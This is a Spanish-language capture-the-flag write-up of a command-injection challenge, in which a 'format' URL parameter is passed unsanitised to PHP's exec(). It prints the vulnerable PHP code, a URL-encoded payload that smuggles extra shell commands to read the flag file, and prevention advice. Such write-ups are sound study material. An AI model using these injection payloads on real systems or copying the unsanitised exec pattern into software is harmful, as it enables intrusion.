🔥 Resumen del Reto
Este desafío consistió en explotar una vulnerabilidad de inyección de comandos en una aplicación web que procesaba un parámetro format en la URL. El objetivo era leer el archivo flag.txt inyectando comandos a través del parámetro. ¡Hack the Planet! 🌍💻

🧠 Detalles de la Explotación
💻 URL Vulnerable
bash
/?format=date%20%27+;%20cd%20..%20;%20pwd;%20cat%20flag%27
# Traducción: date '; cd .. ; pwd; cat flag'
🛠️ Análisis Técnico
🔧 Comando Base:

Si revisábamos el archivo /challenge/models/TimeModel.php podiamos obervar que:
```
Model.php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```
La app usaba date con parámetro de formato (que al revisar controllers/TimeController.php) se notaba que el formato se introducía en la URL como resultado de un GET
```
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```
Notábamos que se ejecutaba (de lo pasado por GET) en $time un exec que puede ejecutar comandos a nivel de sistema, con lo cual atacamos de la forma antes explicada
```
/?format=date%20%27+;%20cd%20..%20;%20pwd;%20cat%20flag%27
```
Uso normal: ?format=Y-m-d → date "Y-m-d"

🔗 Codificación URL:

%20 = Espacio ( )

%27 = Comilla simple (')

%3B = Punto y coma (;) [no usado aquí pero común] para separar comandos

Si hacíamos un 
```
pwd
```
nos encontrábamos en /www, con lo cual había que redirigirse a /flag para encontrar la flag
💣 Payload Malicioso:

bash
date ''; cd ..; pwd; cat flag'
# 🎯 Rompe la consulta original y añade comandos
⚡ Comandos Ejecutados:

bash
1. date ''        # Comando original neutralizado
2. cd ..          # 📂 Navegación de directorios
3. pwd            # 🗺️ Verificación de ruta (opcional)
4. cat flag       # 🏁 ¡Obtención de la flag!
🕵️ ¿Cómo Funcionó?
La aplicación vulnerable tenía este flujo:

php
<?php
$format = $_GET['format'];
exec("date '$format'");  # ¡Peligro! Input sin sanitizar
?>
🛡️ Medidas de Prevención
Tácticas de Seguridad	Ejemplos
🔐 Validación de Input	filter_var()
🚫 Listas Blancas	Solo permitir Y-m-d, H:i:s
⚔️ Escapado de Caracteres	escapeshellarg()
🛑 Evitar Comandos Shell	Usar DateTime() de PHP
📌 Lecciones Aprendidas
Nunca confíes en el input del usuario 🚨

Los parámetros URL son vectores comunes de ataque 🎯

Siempre sanitiza y valida los datos 🔍

Usa alternativas seguras a system()/exec() 🛡️

¡Happy Hacking! 😈💻 (pero solo en entornos autorizados)
